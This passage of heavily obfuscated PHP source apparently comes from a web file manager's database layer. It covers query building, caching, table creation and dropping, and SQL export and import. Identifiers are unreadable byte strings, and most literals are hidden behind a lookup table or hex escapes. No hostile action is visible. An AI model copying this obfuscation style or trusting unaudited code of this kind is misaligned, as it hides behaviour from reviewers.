$this->parseBind(!empty($ßÔüó∞Æ[$ﬂµ±ºÜˆ[294]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[294]] : array())); } public function select($ò‹•˚Ë˝ = array()) { $¬’¡†¢õ =& $_SERVER[Á≈ ä ∞]; $this->model = $ò‹•˚Ë˝[$¬’¡†¢õ[290]]; $ÛÉì∫Öâ = $this->buildSelectSql($ò‹•˚Ë˝); $æ‡öûä√ = isset($ò‹•˚Ë˝[$¬’¡†¢õ[358]]) ? $ò‹•˚Ë˝[$¬’¡†¢õ[358]] : !1; if ($æ‡öûä√) { $‹¡Ò£é∑ = is_string($æ‡öûä√[$¬’¡†¢õ[104]]) ? $æ‡öûä√[$¬’¡†¢õ[104]] : $¬’¡†¢õ[1046] . md5($ÛÉì∫Öâ); $©ûß•»∆ = think_cache($‹¡Ò£é∑, $¬’¡†¢õ[22], $æ‡öûä√); if (!1 !== $©ûß•»∆) { return $©ûß•»∆; } } $¶ø›ı‚à = $this->query($ÛÉì∫Öâ, $this->parseBind(!empty($ò‹•˚Ë˝[$¬’¡†¢õ[294]]) ? $ò‹•˚Ë˝[$¬’¡†¢õ[294]] : array())); if ($æ‡öûä√ && !1 !== $¶ø›ı‚à) { think_cache($‹¡Ò£é∑, $¶ø›ı‚à, $æ‡öûä√); } return $¶ø›ı‚à; } public function buildSelectSql($¸ó„ÒØı = array()) { $ïı«Íêí =& $_SERVER[Á≈ ä ∞]; if (isset($¸ó„ÒØı[$ïı«Íêí[362]])) { if (strpos($¸ó„ÒØı[$ïı«Íêí[362]], $ïı«Íêí[60])) { list($®ﬂ≤çÙ†, $¨ªø°°) = explode($ïı«Íêí[60], $¸ó„ÒØı[$ïı«Íêí[362]]); } else { $®ﬂ≤çÙ† = $¸ó„ÒØı[$ïı«Íêí[362]]; } $®ﬂ≤çÙ† = $®ﬂ≤çÙ† ? $®ﬂ≤çÙ† : 1; $¨ªø°° = isset($¨ªø°°) ? $¨ªø°° : (is_numeric($¸ó„ÒØı[$ïı«Íêí[301]]) ? $¸ó„ÒØı[$ïı«Íêí[301]] : 20); $ìÌ‡Ù€≤ = $¨ªø°° * ((int) $®ﬂ≤çÙ† - 1); $¸ó„ÒØı[$ïı«Íêí[301]] = $ìÌ‡Ù€≤ . $ïı«Íêí[60] . $¨ªø°°; } if (think_config($ïı«Íêí[1047])) { $Ó±òñº∂ = $ïı«Íêí[1048] . md5(serialize($¸ó„ÒØı)); $…ˆ—Ãé∂ = think_cache($Ó±òñº∂); if ($…ˆ—Ãé∂) { return $…ˆ—Ãé∂; } } $ÂñÓà⁄Ø = $this->parseSql($this->selectSql, $¸ó„ÒØı); $ÂñÓà⁄Ø .= $this->parseLock(isset($¸ó„ÒØı[$ïı«Íêí[850]]) ? $¸ó„ÒØı[$ïı«Íêí[850]] : !1); if (isset($Ó±òñº∂)) { think_cache($Ó±òñº∂, $ÂñÓà⁄Ø); } return $ÂñÓà⁄Ø; } public function parseSql($À≈≈·ÿö, $∆∏ƒµπË = array()) { $Ç˝¨∑øı =& $_SERVER[Á≈ ä ∞]; $À≈≈·ÿö = str_replace(array($Ç˝¨∑øı[1049], $Ç˝¨∑øı[1050], $Ç˝¨∑øı[1051], $Ç˝¨∑øı[1052], $Ç˝¨∑øı[1053], $Ç˝¨∑øı[1054], $Ç˝¨∑øı[1055], $Ç˝¨∑øı[1056], $Ç˝¨∑øı[1057], $Ç˝¨∑øı[1058], $Ç˝¨∑øı[1059]), array($this->parseTable("{$∆∏ƒµπË[$Ç˝¨∑øı[288]]}"), $this->parseDistinct(isset($∆∏ƒµπË[$Ç˝¨∑øı[1060]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[1060]] : !1), $this->parseField(!empty($∆∏ƒµπË[$Ç˝¨∑øı[282]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[282]] : $Ç˝¨∑øı[198]), $this->parseJoin(!empty($∆∏ƒµπË[$Ç˝¨∑øı[291]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[291]] : $Ç˝¨∑øı[22]), $this->parseWhere(!empty($∆∏ƒµπË[$Ç˝¨∑øı[284]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[284]] : $Ç˝¨∑øı[22]), $this->parseGroup(!empty($∆∏ƒµπË[$Ç˝¨∑øı[524]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[524]] : $Ç˝¨∑øı[22]), $this->parseHaving(!empty($∆∏ƒµπË[$Ç˝¨∑øı[1061]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[1061]] : $Ç˝¨∑øı[22]), $this->parseOrder(!empty($∆∏ƒµπË[$Ç˝¨∑øı[374]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[374]] : $Ç˝¨∑øı[22]), $this->parseLimit(!empty($∆∏ƒµπË[$Ç˝¨∑øı[301]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[301]] : $Ç˝¨∑øı[22]), $this->parseUnion(!empty($∆∏ƒµπË[$Ç˝¨∑øı[356]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[356]] : $Ç˝¨∑øı[22]), $this->parseComment(!empty($∆∏ƒµπË[$Ç˝¨∑øı[363]]) ? $∆∏ƒµπË[$Ç˝¨∑øı[363]] : $Ç˝¨∑øı[22])), $À≈≈·ÿö); return $À≈≈·ÿö; } public function getLastSql($Îﬂﬂ†æÑ = '') { return $Îﬂﬂ†æÑ ? $this->modelSql[$Îﬂﬂ†æÑ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($⁄ÉÿÚè∆) { return addslashes($⁄ÉÿÚè∆); } public function setModel($¿¿ï·ƒ¸) { $this->model = $¿¿ï·ƒ¸; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÏÂΩçú‚ = array()) { $⁄ﬂ’ùÎ“ =& $_SERVER[Á≈ ä ∞]; if (empty($ÏÂΩçú‚)) { $ÏÂΩçú‚ = $GLOBALS[$⁄ﬂ’ùÎ“[16]][$⁄ﬂ’ùÎ“[31]]; } $this->database = $ÏÂΩçú‚; } public function model($ÅÊó‰ï¶ = '') { return new ModelBase($ÅÊó‰ï¶, $_SERVER[Á≈ ä ∞][22], $this->database); } public function db($Ÿø©»÷— = false) { $Ø¡‚¢Õ’ =& $_SERVER[Á≈ ä ∞]; $ﬁ€›î¢’ = array_change_key_case($this->database); if ($this->dbType() == $Ø¡‚¢Õ’[23] || !$Ÿø©»÷—) { return $this->model()->db(); } $√’æÜçÈ = $ﬁ€›î¢’[$Ø¡‚¢Õ’[975]]; $ﬁ€›î¢’[$Ø¡‚¢Õ’[975]] = $Ø¡‚¢Õ’[22]; if ($ﬁ€›î¢’[$Ø¡‚¢Õ’[970]] == $Ø¡‚¢Õ’[967]) { $Æ‚¨í◊≠ = $ﬁ€›î¢’[$Ø¡‚¢Õ’[976]]; $ﬁ€›î¢’[$Ø¡‚¢Õ’[976]] = substr($Æ‚¨í◊≠, 0, strrpos($Æ‚¨í◊≠, $Ø¡‚¢Õ’[1062])); } $this->database = $ﬁ€›î¢’; $ßÃ§é á = $this->model()->db(); try { $©™òŸÂÎ = $ßÃ§é á->execute("\163\150\x6f\167\x20\144\141\164\x61\142\141\x73\145\163\40\154\151\x6b\145\x20\x27{$√’æÜçÈ}\x27"); } catch (Exception $À™ÅÈÚ€) { } if (!$©™òŸÂÎ) { $ßÃ§é á->execute("\x63\162\x65\141\164\x65\40\x64\x61\x74\x61\142\141\163\x65\40\x60{$√’æÜçÈ}\140"); } $ﬁ€›î¢’[$Ø¡‚¢Õ’[975]] = $√’æÜçÈ; if ($ﬁ€›î¢’[$Ø¡‚¢Õ’[970]] == $Ø¡‚¢Õ’[967]) { $ﬁ€›î¢’[$Ø¡‚¢Õ’[976]] .= $Ø¡‚¢Õ’[1062] . $√’æÜçÈ; } $this->database = $ﬁ€›î¢’; $ßÃ§é á->execute("\x75\x73\x65\x20\140{$√’æÜçÈ}\140"); return $ßÃ§é á; } public function createTable($ìß˛é»Ö, &$Ï·’Ê¿Œ) { $òÈÁóè” =& $_SERVER[Á≈ ä ∞]; if (!IO::exist($ìß˛é»Ö)) { ActionCall($òÈÁóè”[1063], !0, 0); show_json(LNG($òÈÁóè”[1064]), !1); } $ú®µ‡†˝ = $this->model()->db(); $ÃéŸôÕÔ = sqlSplit(IO::getContent($ìß˛é»Ö)); foreach ($ÃéŸôÕÔ as $ÖÔåÔ›ä) { $Æç∂Ä¶˛ = stripos($ÖÔåÔ›ä, $òÈÁóè”[1065]) === 0; if ($Æç∂Ä¶˛) { $Ï·’Ê¿Œ->task[$òÈÁóè”[793]] += 1; } $ú®µ‡†˝->execute($ÖÔåÔ›ä); if ($Æç∂Ä¶˛) { preg_match($òÈÁóè”[1066], $ÖÔåÔ›ä, $êÏå˙≈ﬂ); $Ï·’Ê¿Œ->task[$òÈÁóè”[1067]] = $êÏå˙≈ﬂ[1]; $Ï·’Ê¿Œ->update(1); } } } public function insertTable($∞ˆ˝›Ê§, &$¸œÎÏñœ) { $√•›≥∑ =& $_SERVER[Á≈ ä ∞]; $›∞¯ êö = $this->model()->db(); $ú˙‘µ…Ò = $éìÚÁª‡ ? array($éìÚÁª‡) : $›∞¯ êö->getTables(); foreach ($∞ˆ˝›Ê§ as $’Ñ±Ó˛Ú) { $éìÚÁª‡ = basename($’Ñ±Ó˛Ú, $√•›≥∑[795]); if (!in_array($éìÚÁª‡, $ú˙‘µ…Ò)) { continue; } $¸œÎÏñœ->task[$√•›≥∑[1067]] = $éìÚÁª‡; if (get_filesize($’Ñ±Ó˛Ú) == 0) { continue; } $ôêª¯ãü = $this->sqlToDb($’Ñ±Ó˛Ú, $¸œÎÏñœ); if (!$ôêª¯ãü) { ActionCall($√•›≥∑[1063], !0, 0); show_json(LNG($√•›≥∑[1068]) . "\x5b{$éìÚÁª‡}\x5d", !1); } } } public function sqlFromDb($ﬁ˜≤˘∞Ó, $¥Ü¶ÔóÇ, &$ÔÂ¨˚í¬, $ïÖÕ¢∂∑ = '') { if ($ÔÂ¨˚í¬) { $ÔÂ¨˚í¬->task[$_SERVER[Á≈ ä ∞][1067]] = $ﬁ˜≤˘∞Ó; } $Ó‰Ã∫ƒ = $this->model($ﬁ˜≤˘∞Ó); $±¿˚ÿ¸˙ = 0; $‘È¸îÑ· = 0; $íÙƒÚÕ¶ = 10000; $¬˙”Ä€ñ = fopen($¥Ü¶ÔóÇ, $_SERVER[Á≈ ä ∞][1069]); $Ùâ∞˝§Œ = $Ó‰Ã∫ƒ->getPk(); $ñÃÂÚï® = $Ó‰Ã∫ƒ->getDbFields(); $∆¶¸ù“Ç = $_SERVER[Á≈ ä ∞][22]; if ($GLOBALS[$_SERVER[Á≈ ä ∞][794]] && in_array($ﬁ˜≤˘∞Ó, array($_SERVER[Á≈ ä ∞][1070], $_SERVER[Á≈ ä ∞][1071]))) { $∆¶¸ù“Ç = $ﬁ˜≤˘∞Ó; } do { $ñ∑⁄ﬁÄﬁ = array($Ùâ∞˝§Œ => array($_SERVER[Á≈ ä ∞][1017], $‘È¸îÑ·)); $ØµÜœ“È = $Ó‰Ã∫ƒ->where($ñ∑⁄ﬁÄﬁ)->field($ñÃÂÚï®)->order($Ùâ∞˝§Œ . $_SERVER[Á≈ ä ∞][1072])->limit($íÙƒÚÕ¶)->select(); $ØµÜœ“È = !empty($ØµÜœ“È) ? $ØµÜœ“È : array(); if (!($ÃøË∏êﬂ = count($ØµÜœ“È))) { break; } $≈ÑÓ˘˙Ö = end($ØµÜœ“È); $‘È¸îÑ· = $≈ÑÓ˘˙Ö[$Ùâ∞˝§Œ]; $à®«çñ = array(); foreach ($ØµÜœ“È as $…Õøëœ´) { if ($∆¶¸ù“Ç) { if ($ﬁ˜≤˘∞Ó == $_SERVER[Á≈ ä ∞][1070]) { if ($…Õøëœ´[$_SERVER[Á≈ ä ∞][43]] == $_SERVER[Á≈ ä ∞][1073]) { $—ò›ï´◊ = json_decode($…Õøëœ´[$_SERVER[Á≈ ä ∞][383]], !0); if ($—ò›ï´◊[$_SERVER[Á≈ ä ∞][42]] == $GLOBALS[$_SERVER[Á≈ ä ∞][794]] && $—ò›ï´◊[$_SERVER[Á≈ ä ∞][757]] != 1) { continue; } } } else { if ($…Õøëœ´[$_SERVER[Á≈ ä ∞][43]] == $_SERVER[Á≈ ä ∞][1074] && $…Õøëœ´[$_SERVER[Á≈ ä ∞][104]] == $_SERVER[Á≈ ä ∞][786]) { continue; } } } if ($ïÖÕ¢∂∑) { $…Õøëœ´[$_SERVER[Á≈ ä ∞][94]] = "\173\151\x6f\72{$ïÖÕ¢∂∑}\175" . substr($…Õøëœ´[$_SERVER[Á≈ ä ∞][94]], strlen("\x7b\x69\x6f\72{$…Õøëœ´[$_SERVER[Á≈ ä ∞][824]]}\x7d")); $…Õøëœ´[$_SERVER[Á≈ ä ∞][824]] = $ïÖÕ¢∂∑; } $à®«çñ[] = $_SERVER[Á≈ ä ∞][1075] . $this->sqlEncode($…Õøëœ´) . $_SERVER[Á≈ ä ∞][1076]; } $¢®ßó∞˛ = "\x49\x4e\123\x45\122\x54\x20\x49\x4e\x54\x4f\x20\x60{$ﬁ˜≤˘∞Ó}\140\x20\50\140" . implode($_SERVER[Á≈ ä ∞][1077], $ñÃÂÚï®) . $_SERVER[Á≈ ä ∞][1078]; fwrite($¬˙”Ä€ñ, $¢®ßó∞˛ . implode($_SERVER[Á≈ ä ∞][1079], $à®«çñ) . $_SERVER[Á≈ ä ∞][81] . PHP_EOL); $±¿˚ÿ¸˙ += $ÃøË∏êﬂ; if ($ÔÂ¨˚í¬) { $ÔÂ¨˚í¬->update($ÃøË∏êﬂ); } } while ($íÙƒÚÕ¶ == $ÃøË∏êﬂ); fclose($¬˙”Ä€ñ); return $±¿˚ÿ¸˙; } public function sqlToDb($Ó‘˜±¶Ê, &$úÚºëŒî) { $”«ÒìﬂŸ =& $_SERVER[Á≈ ä ∞]; $¸Ï±ßõò = $this->model()->db(); $ÄÄ∫∂Æë = @fopen($Ó‘˜±¶Ê, $”«ÒìﬂŸ[1080]); if (!$ÄÄ∫∂Æë) { return !1; } $¡Ë˚‰Äÿ = 0; $åå‘ì∂º = $”«ÒìﬂŸ[22]; $ò˛•Û≤° = array(); $‹ØÄø¢· = $this->dbType(); $ë˜µÇèÊ = $‹ØÄø¢· == $”«ÒìﬂŸ[23] ? 500 : 2000; $‹¬ïÊêÀ = basename($Ó‘˜±¶Ê, $”«ÒìﬂŸ[795]); $∂Ê¥Ò¯Ô = 0; $‘¥ªÿ¡é = 4194304 - 104858; $Ûç— ‘‘ = 1000000 - 104858; while (!feof($ÄÄ∫∂Æë)) { $ñ“©ÙæÉ = trim(fgets($ÄÄ∫∂Æë)); if (!$ñ“©ÙæÉ) { continue; } $ªÁœŸø¿ = $this->sqlDecode($ñ“©ÙæÉ, $‹ØÄø¢·, $‹¬ïÊêÀ); if (stripos($ªÁœŸø¿, $”«ÒìﬂŸ[364]) === 0) { if (!$åå‘ì∂º) { $åå‘ì∂º = $ªÁœŸø¿ . $”«ÒìﬂŸ[63]; } continue; } if ($úÚºëŒî) { $úÚºëŒî->task[$”«ÒìﬂŸ[793]] += 1; } $¡Ë˚‰Äÿ++; $ò˛•Û≤°[] = rtrim(rtrim(trim($ªÁœŸø¿), $”«ÒìﬂŸ[60]), $”«ÒìﬂŸ[81]); $†∫Ù‘›Ë = null; $≠≥Ω˚Å¨ = strlen($ªÁœŸø¿); $∂Ê¥Ò¯Ô += $≠≥Ω˚Å¨; if ($∂Ê¥Ò¯Ô >= ($ë˜µÇèÊ == 500 ? $Ûç— ‘‘ : $‘¥ªÿ¡é)) { $†∫Ù‘›Ë = array_pop($ò˛•Û≤°); if ($¡Ë˚‰Äÿ > 1) { $¡Ë˚‰Äÿ--; } } if ($¡Ë˚‰Äÿ >= $ë˜µÇèÊ || $†∫Ù‘›Ë) { $ªÁœŸø¿ = $åå‘ì∂º . implode($”«ÒìﬂŸ[60], $ò˛•Û≤°); if (!$¸Ï±ßõò->execute($ªÁœŸø¿)) { return !1; } if ($úÚºëŒî) { $úÚºëŒî->update($¡Ë˚‰Äÿ); } $ò˛•Û≤° = array(); $¡Ë˚‰Äÿ = 0; $∂Ê¥Ò¯Ô = 0; if ($†∫Ù‘›Ë) { $ò˛•Û≤° = array($†∫Ù‘›Ë); $¡Ë˚‰Äÿ = 1; $∂Ê¥Ò¯Ô = $≠≥Ω˚Å¨; } } } fclose($ÄÄ∫∂Æë); if (!empty($ò˛•Û≤°)) { $ªÁœŸø¿ = $åå‘ì∂º . implode($”«ÒìﬂŸ[60], $ò˛•Û≤°); if (!$¸Ï±ßõò->execute($ªÁœŸø¿)) { return !1; } if ($úÚºëŒî) { $úÚºëŒî->update($¡Ë˚‰Äÿ); } } return !0; } public function dropTable($à…Ö…ºÏ = null) { $ú®∑Í◊æ = $this->model()->db(); $°¢à¯ª£ = $à…Ö…ºÏ ? array($à…Ö…ºÏ) : $ú®∑Í◊æ->getTables(); if (!$°¢à¯ª£) { return; } foreach ($°¢à¯ª£ as $à…Ö…ºÏ) { if ($à…Ö…ºÏ) { $à…Ö…ºÏ = strtolower($à…Ö…ºÏ); } else { continue; } $ú®∑Í◊æ->execute("\x64\162\157\x70\40\164\141\x62\154\145\40\x69\146\x20\145\x78\x69\x73\164\163\x20\x60{$à…Ö…ºÏ}\140"); } } private function sqlEncode($ÊÊËÄû) { $∂ê–Á¥ê =& $_SERVER[Á≈ ä ∞]; $¿˝ˆÊ¥Ÿ = array(); foreach ($ÊÊËÄû as $é¶èáïÓ) { if (is_array($é¶èáïÓ)) { $é¶èáïÓ = json_encode_force($é¶èáïÓ); } $é¶èáïÓ = addslashes($é¶èáïÓ); $é¶èáïÓ = str_replace(array($∂ê–Á¥ê[1081], $∂ê–Á¥ê[11]), array($∂ê–Á¥ê[1082], $∂ê–Á¥ê[1083]), $é¶èáïÓ); $¿˝ˆÊ¥Ÿ[] = str_replace($∂ê–Á¥ê[68], $∂ê–Á¥ê[1084], $é¶èáïÓ); } return $∂ê–Á¥ê[68] . implode($∂ê–Á¥ê[1085], $¿˝ˆÊ¥Ÿ) . $∂ê–Á¥ê[68]; } private function sqlDecode($ùäÚø˙¥, $±¡πı±Á, $ÔŒ⁄ëï = '') { $Ÿ¿øìÊè =& $_SERVER[Á≈ ä ∞]; $ùäÚø˙¥ = str_replace(array($Ÿ¿øìÊè[1082], $Ÿ¿øìÊè[1083]), array($Ÿ¿øìÊè[1081], $Ÿ¿øìÊè[11]), $ùäÚø˙¥); if ($±¡πı±Á == $Ÿ¿øìÊè[23]) { return $ÔŒ⁄ëï != $Ÿ¿øìÊè[1086] ? stripslashes($ùäÚø˙¥) : $ùäÚø˙¥; } if ($ÔŒ⁄ëï == $Ÿ¿øìÊè[1086]) { $ùäÚø˙¥ = str_replace($Ÿ¿øìÊè[1087], $Ÿ¿øìÊè[128], stripslashes($ùäÚø˙¥)); } return $ùäÚø˙¥; } public function getSqlFile($»ﬁä¨ﬂ† = '') { $ƒÂªâœ⁄ =& $_SERVER[Á≈ ä ∞]; $ÄÔ™»«Ì = $this->dbType(!0); $ï÷¿äæü = CONTROLLER_DIR . "\151\156\x73\164\141\154\154\x2f\x64\x61\164\141\57{$ÄÔ™»«Ì}\56\163\x71\154"; $≠ÉÛÖ≤Ü = file_get_contents($ï÷¿äæü); $Ü˜ÀñÈ = $ƒÂªâœ⁄[1088] . ($ÄÔ™»«Ì == $ƒÂªâœ⁄[811] ? $ƒÂªâœ⁄[1089] : $ƒÂªâœ⁄[1090]) . $ƒÂªâœ⁄[1091]; preg_match_all($Ü˜ÀñÈ, $≠ÉÛÖ≤Ü, $ÀŸ¬¬Ë®); $ÅêÆ¿êÊ = $ÀŸ¬¬Ë®[1]; $¶§ñâ⁄Ì = $this->model()->db(); $ÿ∑ñ≠Ë´ = $¶§ñâ⁄Ì->getTables(); $’÷•‰ªﬂ = TEMP_FILES . $ƒÂªâœ⁄[1092] . date($ƒÂªâœ⁄[758]) . $ƒÂªâœ⁄[18]; del_dir($’÷•‰ªﬂ); mk_dir($’÷•‰ªﬂ); $òß‹§Ì› = $’÷•‰ªﬂ . $ƒÂªâœ⁄[1093]; $Ä™º≤≈û = $’÷•‰ªﬂ . $ƒÂªâœ⁄[1094]; $Æìö∫¿Õ = $ÄÔ™»«Ì == $ƒÂªâœ⁄[23] ? $ƒÂªâœ⁄[811] : $ƒÂªâœ⁄[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\154\x2f\144\141\164\141\x2f{$Æìö∫¿Õ}\56\163\x71\x6c", $’÷•‰ªﬂ); @touch($’÷•‰ªﬂ . $ÄÔ™»«Ì . $ƒÂªâœ⁄[795]); $∏¡˘ã≈ﬂ = fopen($òß‹§Ì›, $ƒÂªâœ⁄[1069]); $…ÏÔ“åì = fopen($Ä™º≤≈û, $ƒÂªâœ⁄[1069]); if ($ÄÔ™»«Ì == $ƒÂªâœ⁄[23]) { $ÿ∑ñ≠Ë´ = array_diff($ÿ∑ñ≠Ë´, array($ƒÂªâœ⁄[791], $ƒÂªâœ⁄[792])); $ÈÌÿÿÜˆ = array($ƒÂªâœ⁄[1095], $ƒÂªâœ⁄[1096], $ƒÂªâœ⁄[1097]); fwrite($…ÏÔ“åì, implode(PHP_EOL, $ÈÌÿÿÜˆ) . PHP_EOL . PHP_EOL); foreach ($ÿ∑ñ≠Ë´ as $‚ﬁ“÷”ù) { $œ¶Öôˆˆ = $this->sqlFromSqlite($‚ﬁ“÷”ù); if (!$œ¶Öôˆˆ[$ƒÂªâœ⁄[23]]) { continue; } fwrite($…ÏÔ“åì, $œ¶Öôˆˆ[$ƒÂªâœ⁄[23]] . PHP_EOL . PHP_EOL); if (!in_array($‚ﬁ“÷”ù, $ÅêÆ¿êÊ)) { fwrite($∏¡˘ã≈ﬂ, $œ¶Öôˆˆ[$ƒÂªâœ⁄[811]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÿ∑ñ≠Ë´ as $‚ﬁ“÷”ù) { $œ¶Öôˆˆ = $this->sqlFromMysql($‚ﬁ“÷”ù); if (!$œ¶Öôˆˆ[$ƒÂªâœ⁄[811]]) { continue; } fwrite($∏¡˘ã≈ﬂ, $œ¶Öôˆˆ[$ƒÂªâœ⁄[811]] . PHP_EOL . PHP_EOL); if (!in_array($‚ﬁ“÷”ù, $ÅêÆ¿êÊ)) { fwrite($…ÏÔ“åì, $œ¶Öôˆˆ[$ƒÂªâœ⁄[23]] . PHP_EOL . PHP_EOL); } } } fclose($∏¡˘ã≈ﬂ); fclose($…ÏÔ“åì); $≠ÉÛÖ≤Ü = array($ƒÂªâœ⁄[811] => $òß‹§Ì›, $ƒÂªâœ⁄[23] => $Ä™º≤≈û); return $»ﬁä¨ﬂ† ? $≠ÉÛÖ≤Ü[$»ﬁä¨ﬂ†] : $≠ÉÛÖ≤Ü; } public function dbType($òËªıÈ™ = false) { $¥ Î“⁄ñ =& $_SERVER[Á≈ ä ∞]; $Ë∂Í¨°‘ = $òËªıÈ™ ? $GLOBALS[$¥ Î“⁄ñ[16]][$¥ Î“⁄ñ[31]] : $this->database; $Ë∂Í¨°‘ = array_change_key_case($Ë∂Í¨°‘); $ø‹ﬁ¥ˆö = $Ë∂Í¨°‘[$¥ Î“⁄ñ[970]]; if ($ø‹ﬁ¥ˆö == $¥ Î“⁄ñ[967]) { $œ˚ﬁ≥û  = explode($¥ Î“⁄ñ[4], $Ë∂Í¨°‘[$¥ Î“⁄ñ[976]]); $ø‹ﬁ¥ˆö = $œ˚ﬁ≥û [0]; } $¿…Ë≈’ﬁ = array($¥ Î“⁄ñ[1098] => $¥ Î“⁄ñ[23], $¥ Î“⁄ñ[915] => $¥ Î“⁄ñ[811]); if (isset($¿…Ë≈’ﬁ[$ø‹ﬁ¥ˆö])) { $ø‹ﬁ¥ˆö = $¿…Ë≈’ﬁ[$ø‹ﬁ¥ˆö]; } return $ø‹ﬁ¥ˆö; } public function sqlFromMysql($¶¡∂éÃ∆, $ª¢õõ˘ê = '') { $©ÁœŒ⁄œ =& $_SERVER[Á≈ ä ∞]; $¡‘ƒè‘é = $this->model()->db(); $Çï…Œ¡™ = $¡‘ƒè‘é->query($©ÁœŒ⁄œ[1099] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[394]); if (!$Çï…Œ¡™ || !$Çï…Œ¡™[0]) { return !1; } $◊úòΩ¬Ö = _get($Çï…Œ¡™[0], $©ÁœŒ⁄œ[1100], $©ÁœŒ⁄œ[22]); if (!$◊úòΩ¬Ö) { return !1; } $ »ŸãÍø = "\x44\122\x4f\120\40\x54\x41\x42\x4c\105\x20\x49\x46\x20\x45\130\111\123\x54\123\x20\140{$¶¡∂éÃ∆}\x60\73" . PHP_EOL . $◊úòΩ¬Ö . $©ÁœŒ⁄œ[81]; if ($ª¢õõ˘ê && $ª¢õõ˘ê == $©ÁœŒ⁄œ[811]) { return $ »ŸãÍø; } $ø¯ç√˙ä = array_change_key_case($GLOBALS[$©ÁœŒ⁄œ[16]][$©ÁœŒ⁄œ[31]]); $æª”ﬂ‹Ë = $ø¯ç√˙ä[$©ÁœŒ⁄œ[975]]; $∑÷Ω∑˙∫ = $©ÁœŒ⁄œ[1101] . $æª”ﬂ‹Ë . $©ÁœŒ⁄œ[1102] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[68]; $Ç˚Œïﬁù = $©ÁœŒ⁄œ[1103] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[903]; $ìÕ«Ü∫© = $¡‘ƒè‘é->query($∑÷Ω∑˙∫); if (empty($ìÕ«Ü∫©)) { $€ÃÆû… = array($©ÁœŒ⁄œ[811] => $©ÁœŒ⁄œ[22], $©ÁœŒ⁄œ[23] => $©ÁœŒ⁄œ[22]); return $ª¢õõ˘ê ? $€ÃÆû…[$ª¢õõ˘ê] : $€ÃÆû…; } $∫˜⁄ãÃÇ = $¡‘ƒè‘é->query($Ç˚Œïﬁù); $“´¿çßó = $©ÁœŒ⁄œ[22]; $ßÕÅóêü = array(); foreach ($∫˜⁄ãÃÇ as $íËä⁄éË) { if (!$“´¿çßó && $íËä⁄éË[$©ÁœŒ⁄œ[1104]] == $©ÁœŒ⁄œ[1105]) { $“´¿çßó = $íËä⁄éË[$©ÁœŒ⁄œ[1106]]; } if (isset($ßÕÅóêü[$íËä⁄éË[$©ÁœŒ⁄œ[1104]]])) { $ßÕÅóêü[$íËä⁄éË[$©ÁœŒ⁄œ[1104]]][$©ÁœŒ⁄œ[1107]][] = $íËä⁄éË[$©ÁœŒ⁄œ[1106]]; continue; } $ßÕÅóêü[$íËä⁄éË[$©ÁœŒ⁄œ[1104]]] = array($©ÁœŒ⁄œ[1108] => $íËä⁄éË[$©ÁœŒ⁄œ[1104]], $©ÁœŒ⁄œ[1107] => array($íËä⁄éË[$©ÁœŒ⁄œ[1106]]), $©ÁœŒ⁄œ[1109] => $íËä⁄éË[$©ÁœŒ⁄œ[1110]] == $©ÁœŒ⁄œ[98] ? 0 : 1); } $ˆÄ⁄√á˜ = array(); foreach ($ßÕÅóêü as $íËä⁄éË) { $˘°©åïó = $íËä⁄éË[$©ÁœŒ⁄œ[1108]] == $©ÁœŒ⁄œ[1105]; $ÙÅÜ÷ùÀ = array($©ÁœŒ⁄œ[1111], $íËä⁄éË[$©ÁœŒ⁄œ[1109]] == $©ÁœŒ⁄œ[98] && !$˘°©åïó ? $©ÁœŒ⁄œ[1112] : $©ÁœŒ⁄œ[22], $©ÁœŒ⁄œ[1113], $©ÁœŒ⁄œ[1114] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[21] . ($˘°©åïó ? $©ÁœŒ⁄œ[1115] : $íËä⁄éË[$©ÁœŒ⁄œ[1108]]) . $©ÁœŒ⁄œ[128], $©ÁœŒ⁄œ[1116], $©ÁœŒ⁄œ[128] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[128], $©ÁœŒ⁄œ[1117] . implode($©ÁœŒ⁄œ[1118], $íËä⁄éË[$©ÁœŒ⁄œ[1107]]) . $©ÁœŒ⁄œ[1119]); $ˆÄ⁄√á˜[] = implode($©ÁœŒ⁄œ[63], $ÙÅÜ÷ùÀ) . $©ÁœŒ⁄œ[81]; } $…ñ¡∑˜ˆ = array(); $ÃÉ◊Ú˜« = array($©ÁœŒ⁄œ[1120] => $©ÁœŒ⁄œ[1121], $©ÁœŒ⁄œ[1121] => $©ÁœŒ⁄œ[1121], $©ÁœŒ⁄œ[297] => $©ÁœŒ⁄œ[324], $©ÁœŒ⁄œ[296] => $©ÁœŒ⁄œ[324]); foreach ($ìÕ«Ü∫© as $íËä⁄éË) { $ÙÅÜ÷ùÀ = array($©ÁœŒ⁄œ[128] . $íËä⁄éË[$©ÁœŒ⁄œ[1122]] . $©ÁœŒ⁄œ[128], isset($ÃÉ◊Ú˜«[$íËä⁄éË[$©ÁœŒ⁄œ[1123]]]) ? $ÃÉ◊Ú˜«[$íËä⁄éË[$©ÁœŒ⁄œ[1123]]] : $íËä⁄éË[$©ÁœŒ⁄œ[1124]], $íËä⁄éË[$©ÁœŒ⁄œ[1125]] == $©ÁœŒ⁄œ[901] ? $©ÁœŒ⁄œ[1126] : $©ÁœŒ⁄œ[1127], $íËä⁄éË[$©ÁœŒ⁄œ[1122]] == $“´¿çßó ? $©ÁœŒ⁄œ[1128] : $©ÁœŒ⁄œ[22], $íËä⁄éË[$©ÁœŒ⁄œ[952]] ? strtoupper(str_replace($©ÁœŒ⁄œ[21], $©ÁœŒ⁄œ[22], 